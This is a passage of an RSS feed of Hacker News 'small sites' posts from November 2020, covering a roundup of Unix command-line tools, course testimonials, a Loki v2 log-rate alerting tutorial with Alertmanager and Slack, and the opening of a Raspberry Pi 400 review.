<a href="https://github.com/tldr-pages/tldr" target="_blank">tldr</a> with perfect support for Windows, Linux, and macOS because the source code is written in Javascript using Node JS.
To install yo need Node JS and run this command</p>
<h2 id="bat-and-cat">Bat and Cat. <a href="#bat-and-cat"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>Cat, created in 1971, its name derives from concatenate is a UNIX utility to render the content of a file on the command line.</p>
<p>This command has helped us for decades to know what a file contains.
But cat falls short of displaying a colored syntax for each different programming language or file format.</p>
<p>Faced with this need we introduce 

<a href="https://github.com/sharkdp/bat" target="_blank">bat</a>, written in Rust, a powerful language.</p>
<p>With an identity interface to cat it provides us with a more comfortable view of the file we are reviewing, it looks more like a text editor than a command line, which increases the user experience and allows better observation of the content of the file.</p>
<div>
<p><img src="https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/image07.png" alt="bat"></p><p>
Image from the official repository <a href="https://github.com/sharkdp/bat">https://github.com/sharkdp/bat</a>
</p>
</div>
<p>Its 

<a href="https://github.com/sharkdp/bat#installation" target="_blank">installation</a> is very easy because it is packaged to be downloaded using a package manager as apt in Ubuntu.</p>
<h2 id="peace-and-concentration">Peace and concentration <a href="#peace-and-concentration"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>In the middle of a modern world, we may have many distractions and perhaps they bother us when working.<br>


<a href="https://github.com/timothycrosley/concentration" target="_blank">Concentration</a> is an open source solution that works in Linux, Macintosh, and Windows.
It’s a small tool written in python that allows us to “block” distracting websites, such as Facebook, Twitter, etc.</p>
<p>Its installation is very simple</p>
<div><pre><code data-lang="shell">
pip3 install concentration

</code></pre></div>
<p>

<a href="https://github.com/federico-terzi/espanso" target="_blank">Espanso</a> is a multiplatform text expander, this means that before you finish writing a word it guesses the word and writes the rest for you.
This helps you write less and increase productivity when you are coding or writing documents.</p>

<p>The installation is 

<a href="https://espanso.org/install/" target="_blank">here</a> available for Windows, Linux, and macOS.</p>
<p>In few words, this tool keeps in memory your navigation history and uses a ranking algorithm to help you to go back to a place just written the first letters of the directory.</p>
<p>So if you navigate to <code>/etc</code> <code>/nginx/sites-available</code> and then you go to <code>/home/documents/</code> but you want to move back to the first place you just need write  <code>z et</code> and the algorithm can know which <code>/etc/</code> match more than <code>/home/documents/</code> and they going to move you to that directory.
Now you can write less and be more intuitive.</p>

<h2 id="be-clean-and-analyze-your-bash-scripts">Be clean and analyze your bash scripts <a href="#be-clean-and-analyze-your-bash-scripts"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>

<a href="https://github.com/koalaman/shellcheck" target="_blank">Shellcheck</a> is a Haskell based beautiful piece of software to check if your bash scripts have bad practices or vulnerabilities.
You can add this to your Dev Ops pipelines to avoid deploy poor quality bash scripts which can decrease the safety of your product.</p>
<p><img src="https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/image11.png" alt="Shellcheck">
</p>
<p>This tool also helps newbies and advanced developers to get more experience creating clean code in bash, a skill very underrated but highly powerful. Necessary in order to be able to master UNIX systems with confidence.</p>
<h2 id="analyze-and-optimize-sql-syntax">Analyze and optimize SQL syntax <a href="#analyze-and-optimize-sql-syntax"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>

<a href="https://github.com/XiaoMi/soar" target="_blank">SOAR</a> is an open-source project created by Xiaomi to evaluate and optimize SQL queries.</p>
<p>It can be used on Linux, Mac, and Windows and is excellent to use in continuous integration pipelines to check the quality of SQL queries.
This can help large teams keep the quality of their queries as good as possible.</p>
<p>This is the 

<a href="https://github.com/XiaoMi/soar/blob/master/doc/install_en.md" target="_blank">installation link</a></p>
<h2 id="closing-words">Closing words <a href="#closing-words"><svg height="22px" viewBox="0 0 24 24" width="22px" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"></path></svg></a></h2><p>Although it is impossible to stop using the classic UNIX tools (because they are simply perfect for many of our use cases), we can choose to experiment and update our toolset with these small open source projects.
Those can make us feel like we have little superpowers to be more productive and write less on the keyboard.</p>
<p>Without a doubt, every day we must let the machines help us do our work.</p>
</div>
                </div></div>]]>
            </description>
            <link>https://www.turtle-techies.com/useful-linux-unix-tools-to-add-to-your-toolbox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014328</guid>
            <pubDate>Sat, 07 Nov 2020 10:44:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introductions to systems thinking – free email course]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014315">thread link</a>) | @aelsabagh123
<br/>
November 7, 2020 | https://www.designforimpact.co/email-courses | <a href="https://web.archive.org/web/*/https://www.designforimpact.co/email-courses">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><img src="https://uploads-ssl.webflow.com/5f6f2949c7ed7c375194f663/5f6f2949db2d9e5692c5ee4e_angle.svg" alt=""><img src="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash.jpg" alt="Testimonial Image" sizes="(max-width: 767px) 100vw, 30vw" srcset="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash-p-2000.jpeg 2000w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash-p-2600.jpeg 2600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash-p-3200.jpeg 3200w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b171440f137cda3de672b_charles-deluvio-bXqOMf5tvDk-unsplash.jpg 4104w"></p><div><div><h4>I’m <strong>thankful</strong> to have been a part of Design for Impact and its Coaching Clinics. <p><strong>It has allowed me to dedicate time each week</strong> in learning Systems Thinking from the basics with the participation of <strong>an engrossed team of thinkers from around the globe</strong>. </p></h4></div></div></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5f6f2949c7ed7c375194f663/5f6f2949db2d9e5692c5ee4e_angle.svg" alt=""><img src="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash.jpg" alt="Testimonial Image" sizes="(max-width: 767px) 100vw, 30vw" srcset="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash-p-2000.jpeg 2000w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash-p-2600.jpeg 2600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash-p-3200.jpeg 3200w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b459b337e3e555fad6_nesa-by-makers-IgUR1iX0mqM-unsplash.jpg 6720w"></p><div><div><h4>Design for Impact has helped give me the <strong>knowledge and skills</strong> needed to enter a career in User Experience. Abram is an excellent instructor and has taught me the fundamentals of UX design and research.<p>The program attracts people from <strong>diverse cultural, educational, and employment backgrounds. </strong>I have enjoyed collaborating to <strong>work through a UX design problem from beginning to end as a team.</strong></p></h4></div></div></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5f6f2949c7ed7c375194f663/5f6f2949db2d9e5692c5ee4e_angle.svg" alt=""><img src="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash.jpg" alt="Testimonial Image" sizes="(max-width: 767px) 100vw, 30vw" srcset="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash-p-2000.jpeg 2000w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash-p-2600.jpeg 2600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash-p-3200.jpeg 3200w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f6b16b31a52cfaf48e8b47d_priscilla-du-preez-XkKCui44iM0-unsplash.jpg 5472w"></p><div><div><h4>I have been leveraging the Design for Impact community to continue learning experience/service design practices. Our exercises are output focused, and <strong>collaboration is productive and enjoyable. </strong><p>What I appreciate most is the <strong>various points of view</strong> I have access to from a group of designers with <strong>diverse backgrounds and expertise from around the globe.</strong></p></h4></div></div></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5f6f2949c7ed7c375194f663/5f6f2949db2d9e5692c5ee4e_angle.svg" alt=""><img src="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash.jpg" alt="Testimonial Image" sizes="(max-width: 767px) 100vw, 30vw" srcset="https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash-p-1080.jpeg 1080w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash-p-2000.jpeg 2000w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash-p-2600.jpeg 2600w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash-p-3200.jpeg 3200w, https://uploads-ssl.webflow.com/5f69c6d6c534d0f4c9292690/5f7c3cba31ccfc6dca6aef3b_kaleidico-7lryofJ0H9s-unsplash.jpg 5425w"></p><div><p><h4><strong>The variety of backgrounds of the community members </strong>is a boon for a novice like me curious to learn more about the various approaches to research, data analysis, and systems thinking as it applies to the social sector.</h4></p></div></div></div></div></div>]]>
            </description>
            <link>https://www.designforimpact.co/email-courses</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014315</guid>
            <pubDate>Sat, 07 Nov 2020 10:41:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chronic procrastination as a coping mechanism for guilt]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014272">thread link</a>) | @neongreen
<br/>
November 7, 2020 | https://freedom.brick.do/7ac11cbf-e4a1-4721-80d0-6bbceeed124a | <a href="https://web.archive.org/web/*/https://freedom.brick.do/7ac11cbf-e4a1-4721-80d0-6bbceeed124a">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://freedom.brick.do/7ac11cbf-e4a1-4721-80d0-6bbceeed124a</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014272</guid>
            <pubDate>Sat, 07 Nov 2020 10:28:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alerting with Loki when your Log Ingestion Rate goes above the set threshold]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014237">thread link</a>) | @rbekker87
<br/>
November 7, 2020 | https://blog.ruanbekker.com/blog/2020/11/06/how-to-setup-alerting-with-loki/ | <a href="https://web.archive.org/web/*/https://blog.ruanbekker.com/blog/2020/11/06/how-to-setup-alerting-with-loki/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://user-images.githubusercontent.com/567298/98380823-bd948880-2051-11eb-8ab4-c8d5f5d3e612.png" alt="image"></p>

<p>Recently Grafana Labs announced <strong><a href="https://grafana.com/blog/2020/10/28/loki-2.0-released-transform-logs-as-youre-querying-them-and-set-up-alerts-within-loki/">Loki v2</a></strong> and its awesome! Definitely check out their blog post on more details.</p>

<p>Loki has a index option called <strong>boltdb-shipper</strong>, which allows you to run Loki with only a object store and you <strong>no longer need a dedicated index store</strong> such as DynamoDB. You can extract labels from log lines at query time, which is CRAZY! And I really like how they’ve implemented it, you can parse, filter and format like mad. I really like that.</p>

<p>And then generating alerts from any query, which we will go into today. Definitely check out <a href="https://grafana.com/blog/2020/10/28/loki-2.0-released-transform-logs-as-youre-querying-them-and-set-up-alerts-within-loki/">this blogpost</a> and <a href="https://grafana.com/blog/2020/11/04/video-top-three-features-of-the-new-loki-2.0/">this video</a> for more details on the features of Loki v2.</p>

<h2>What will we be doing today</h2>

<p>In this tutorial we will setup a alert using the Loki local ruler to alert us when we have <strong>high number of log events coming in</strong>. For example, let’s say someone has debug logging enabled in their application and we want to send a alert to slack when it breaches the threshold.</p>

<p>I will simulate this with a <code>http-client</code> container which runs <code>curl</code> in a while loop to fire a bunch of http requests against the nginx container which logs to Loki, so we can see how the alerting works, and in this scenario we will alert to Slack.</p>

<p>And after that we will stop our http-client container to see how the alarm resolves when the log rate comes down again.</p>

<p>All the components are available in the <code>docker-compose.yml</code> on my <a href="https://github.com/ruanbekker/loki-alerts-docker">github repository</a></p>

<h2>Components</h2>

<p>Let’s break it down and start with the loki config:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
<span>2</span>
<span>3</span>
<span>4</span>
<span>5</span>
<span>6</span>
<span>7</span>
<span>8</span>
<span>9</span>
<span>10</span>
<span>11</span>
<span>12</span>
<span>13</span>
</pre></td><td><pre><code><span>...
</span><span>ruler:
</span><span>  storage:
</span><span>    type: local
</span><span>    local:
</span><span>      directory: /etc/loki/rules
</span><span>  rule_path: /tmp/loki/rules-temp
</span><span>  alertmanager_url: http://alertmanager:9093
</span><span>  ring:
</span><span>    kvstore:
</span><span>      store: inmemory
</span><span>  enable_api: true
</span><span>  enable_alertmanager_v2: true</span></code></pre></td></tr></tbody></table></div></figure>


<p>In the section of the loki config, I will be making use of the local ruler and map my alert rules under <code>/etc/loki/rules/</code> and we are also defining our alertmanager instance where these alerts should be shipped to.</p>

<p>In my rule definition <code>/etc/loki/rules/demo/rules.yml</code>:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
<span>2</span>
<span>3</span>
<span>4</span>
<span>5</span>
<span>6</span>
<span>7</span>
<span>8</span>
<span>9</span>
<span>10</span>
<span>11</span>
<span>12</span>
<span>13</span>
<span>14</span>
<span>15</span>
<span>16</span>
<span>17</span>
<span>18</span>
<span>19</span>
<span>20</span>
<span>21</span>
</pre></td><td><pre><code><span>groups:
</span><span>  - name: rate-alerting
</span><span>    rules:
</span><span>      - alert: HighLogRate
</span><span>        expr: |
</span><span>          sum by (compose_service)
</span><span>            (rate({job="dockerlogs"}[1m]))
</span><span>            &gt; 60
</span><span>        for: 1m
</span><span>        labels:
</span><span>            severity: warning
</span><span>            team: devops
</span><span>            category: logs
</span><span>        annotations:
</span><span>            title: "High LogRate Alert"
</span><span>            description: "something is logging a lot"
</span><span>            impact: "impact"
</span><span>            action: "action"
</span><span>            dashboard: "https://grafana.com/service-dashboard"
</span><span>            runbook: "https://wiki.com"
</span><span>            logurl: "https://grafana.com/log-explorer"</span></code></pre></td></tr></tbody></table></div></figure>


<p>In my expression, I am using LogQL to return per second rate of all my docker logs within the last minute per compose service for my dockerlogs job and we are specifying that it should alert when the threshold is above 60.</p>

<p>As you can see I have a couple of <strong>labels and annotations</strong>, which becomes <strong>very useful</strong> when you have dashboard links, runbooks etc and you would like to map that to your alert. I am doing the mapping in my <code>alertmanager.yml</code> config:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
<span>2</span>
<span>3</span>
<span>4</span>
<span>5</span>
<span>6</span>
<span>7</span>
<span>8</span>
<span>9</span>
<span>10</span>
<span>11</span>
<span>12</span>
<span>13</span>
<span>14</span>
<span>15</span>
<span>16</span>
<span>17</span>
<span>18</span>
<span>19</span>
<span>20</span>
<span>21</span>
<span>22</span>
<span>23</span>
<span>24</span>
<span>25</span>
<span>26</span>
<span>27</span>
<span>28</span>
<span>29</span>
<span>30</span>
</pre></td><td><pre><code><span>route:
</span><span>...
</span><span>  receiver: 'default-catchall-slack'
</span><span>  routes:
</span><span>  - match:
</span><span>      severity: warning
</span><span>    receiver: warning-devops-slack
</span><span>    routes:
</span><span>    - match_re:
</span><span>        team: .*(devops).*
</span><span>      receiver: warning-devops-slack
</span><span>
</span><span>receivers:
</span><span>...
</span><span>- name: 'warning-devops-slack'
</span><span>  slack_configs:
</span><span>    - send_resolved: true
</span><span>      channel: '__SLACK_CHANNEL__'
</span><span>      title: ':fire::white_check_mark: []  '
</span><span>      text: &gt;-
</span><span>        
</span><span>          *Description:* 
</span><span>          *Severity:* ``
</span><span>          *Graph:* &lt;|:chart_with_upwards_trend:&gt;&lt;|:chart_with_upwards_trend:&gt; *Dashboard:* &lt;|:bar_chart:&gt; *Runbook:* &lt;|:spiral_note_pad:&gt;
</span><span>          *Details:*
</span><span>           - *:* ``
</span><span>          
</span><span>           - *Impact*: 
</span><span>           - *Receiver*: warning--slack
</span><span>        </span></code></pre></td></tr></tbody></table></div></figure>


<p>As you can see, when my alert matches nothing it will go to my catchall receiver, but when my label contains <code>devops</code> and the route the alert to my <code>warning-devops-slack</code> receiver, and then we will be parsing our labels and annotations to include the values in our alarm on slack.</p>

<h2>Demo</h2>

<p>Enough with the background details, and it’s time to get into the action.</p>

<p>All the code for this demonstration will be available in my github repository: <strong><a href="https://github.com/ruanbekker/loki-alerts-docker">github.com/ruanbekker/loki-alerts-docker</a></strong></p>

<p>The docker-compose will have a container of <strong>grafana</strong>, <strong>alertmanager</strong>, <strong>loki</strong>, <strong>nginx</strong> and a <strong>http-client</strong>.</p>

<p>The http-client is curl in a while loop that will just make a bunch of http requests against the nginx container, which will be logging to loki.</p>

<h2>Get the source</h2>

<p>Get the code from my github repository:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
<span>2</span>
</pre></td><td><pre><code><span>$ git clone https://github.com/ruanbekker/loki-alerts-docker
</span><span>$ cd loki-alerts-docker</span></code></pre></td></tr></tbody></table></div></figure>


<p>You will need to replace the slack webhook url and the slack channel where you want your alerts to be sent to. This will take the environment variables and replace the values in <code>config/alertmanager.yml</code> (always check out the script first, before executing it)</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>$ SLACK_WEBHOOK_URL="https://hooks.slack.com/services/xx/xx/xx" SLACK_CHANNEL="#notifications" ./parse_configs.sh</span></code></pre></td></tr></tbody></table></div></figure>


<p>You can double check by running <code>cat config/alertmanager.yml</code>, once you are done, boot the stack:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>$ docker-compose up -d</span></code></pre></td></tr></tbody></table></div></figure>


<p>Open up grafana:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>$ open http://grafana.localdns.xyz:3000</span></code></pre></td></tr></tbody></table></div></figure>


<p>Use the initial user and password combination <code>admin/admin</code> and then reset your password:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98379039-7efdce80-204f-11eb-9c8a-3ed12a63cb14.png" alt="image"></p>

<p>Browse for your labels on the log explorer section, in my example it will be <code>{job="dockerlogs"}</code>:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98379172-ace31300-204f-11eb-8e6c-3cf073afe771.png" alt="image"></p>

<p>When we select our job=“dockerlogs” label, we will see our logs:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98379288-c71cf100-204f-11eb-911c-043a983bae6d.png" alt="image"></p>

<p>As I explained earlier the query that we will be running in our ruler, can be checked what the rate currently is:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>sum by (compose_project, compose_service) (rate({job="dockerlogs"}[1m]))</span></code></pre></td></tr></tbody></table></div></figure>


<p>Which will look like this:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98379765-54604580-2050-11eb-9c90-5e0adf2bb586.png" alt="image"></p>

<p>In the configured expression in our ruler config, we have set to alarm once the value goes above 60, we can validate this by running:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>sum by (compose_project, compose_service) (rate({job="dockerlogs"}[1m])) &gt; 60</span></code></pre></td></tr></tbody></table></div></figure>


<p>And we can verify that this is the case, and by now it should be alarming:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98379900-84a7e400-2050-11eb-87d0-ae52617d195e.png" alt="image"></p>

<p>Head over to alertmanager:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>$ open http://alertmanager.localdns.xyz:9093</span></code></pre></td></tr></tbody></table></div></figure>


<p>We can see alertmanager is showing the alarm:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98380013-af923800-2050-11eb-8585-f7489bf722cb.png" alt="image"></p>

<p>When we head over to slack, we can see our notification:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98380158-de101300-2050-11eb-8d73-20828124fab5.png" alt="image"></p>

<p>So let’s stop our http client:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
<span>2</span>
</pre></td><td><pre><code><span>$ docker-compose stop http-client
</span><span>Stopping http-client ... done</span></code></pre></td></tr></tbody></table></div></figure>


<p>Then we can see the logging stopped:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98380907-e0bf3800-2051-11eb-99c3-b3b9ac22bba5.png" alt="image"></p>

<p>And in slack, we should see that the alarm recovered and we should see the notification:</p>

<p><img src="https://user-images.githubusercontent.com/567298/98381360-722eaa00-2052-11eb-8bb4-07cdc8ffa7ee.png" alt="image"></p>

<p>Then you can terminate your stack:</p>

<figure><div><table><tbody><tr><td><pre><span>1</span>
</pre></td><td><pre><code><span>$ docker-compose down</span></code></pre></td></tr></tbody></table></div></figure>


<p>Pretty epic stuff right? I really love how cost effective Loki is as logging use to be so expensive to run and especially maintain, Grafana Labs are really doing some epic work and my hat goes off to them.</p>

<h2>Thanks</h2>

<p>I hope you found this useful, feel free to reach out to me on Twitter <strong><a href="https://twitter.com/ruanbekker">@ruanbekker</a></strong> or visit me on my website <strong><a href="https://ruan.dev/">ruan.dev</a></strong></p>
</div></div>]]>
            </description>
            <link>https://blog.ruanbekker.com/blog/2020/11/06/how-to-setup-alerting-with-loki/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014237</guid>
            <pubDate>Sat, 07 Nov 2020 10:18:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi 400 – First Impressions]]>
            </title>
            <description>
<![CDATA[
Score 245 | Comments 143 (<a href="https://news.ycombinator.com/item?id=25014025">thread link</a>) | @martinpeck
<br/>
November 7, 2020 | https://martinpeck.com/blog/2020/11/06/Raspberry-Pi-400/ | <a href="https://web.archive.org/web/*/https://martinpeck.com/blog/2020/11/06/Raspberry-Pi-400/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>I grew up programming on my TV, with a Sinclair ZX81 followed by a ZX Spectum. Computers built into keyboards, that you can easily plug into a TV, are part of my DNA. So, given this, how could I resist buying the new <a href="https://www.raspberrypi.org/products/raspberry-pi-400/">Raspberry Pi 400</a>!?</p>

<p>The following are my initial thoughts on the hardware, and on using it for light weight development.</p>

<p>TL;DR: I like it :)</p>

<h2 id="tech-specs">Tech Specs</h2>

<p>The Raspberry Pi 400 is, essentially, a Raspberry Pi 4 housed within a keyboard. You can read much better descriptions elseewhere, but the main points from the tech specs are:</p>

<ul>
  <li>Broadcom BCM2711 quad-core Cortex-A72 (ARM v8) 64-bit SoC @ 1.8GHz</li>
  <li>4GB LPDDR4-3200</li>
  <li>Dual-band (2.4GHz and 5.0GHz) IEEE 802.11b/g/n/ac wireless LAN</li>
  <li>Bluetooth 5.0, BLE</li>
  <li>Gigabit Ethernet</li>
  <li>2 × USB 3.0</li>
  <li>1 × USB 2.0 ports</li>
  <li>Horizontal 40-pin GPIO header</li>
  <li>2 × micro HDMI ports (supports up to 4Kp60)</li>
  <li>MicroSD card slot for operating system and data storage</li>
  <li>79-key compact keyboard</li>
</ul>

<p>(full specs can be found <a href="https://www.raspberrypi.org/products/raspberry-pi-400/specifications/">here</a>)</p>

<p>The 400 comes with a 16GB SD card pre-installed with Raspbian, and a host of apps (LibreOffice), dev tools (Geany, Mathematica, Scratch), utilities (Chromium, VLC Media Player), and games (Minecraft).</p>

<h2 id="first-impressions-on-the-hardware">First Impressions on the Hardware</h2>

<p>It was <em>very</em> easy to plug the 400 in and get it up and running. It’s a neat device, with a good collection of ports and connectors at the back. The keyboard is…ok. The device is £67 in the UK. I bought the kit (which includes a mouse, power supply, HDMI cable, and official guide) for £94. Given the price point the keyboard is absolutely fine, but it does feel a tiny bit “plasticy”.</p>

<p>The 400 doesn’t have an audio-out. Audio is delivered via the HDMI output. For me, that’s a problem because my monitor doesn’t have speakers. It’s not a BIG problem, but it’s something I hadn’t considered.</p>

<p>The other thing the 400 doesn’t have is the connector for the Raspberry Pi camera module. Again, this isn’t a big deal for me but if you were expecting to build any camera projects then the 400 isn’t the right choice.</p>

<p>The 400has the GPIO header at the back, so with a ribbon cable you can build electronics projects very easily. I have an <a href="https://www.adafruit.com/product/2028">Adafruit T-Cobbler Plus</a> which makes it very easy to connect the 400 to a breadboard and build…stuff!</p>

<p><img src="https://martinpeck.com/images/rpi400/gpio.jpg" alt="GPIO"></p>

<p>The 400 starts up quickly, and is very capable as a general purpose desktop device. I’ve spent most of today browsing the web on it, while also installing apps, running docker containers, and building code, and it’s felt fast/snappy pretty much most of the time.</p>

<p>Overall, the hardware is pretty good and I love the form factor. I can see schools/code clubs purchasing these devices and using the in their computing labs.</p>

<h2 id="developer-experience">Developer Experience</h2>

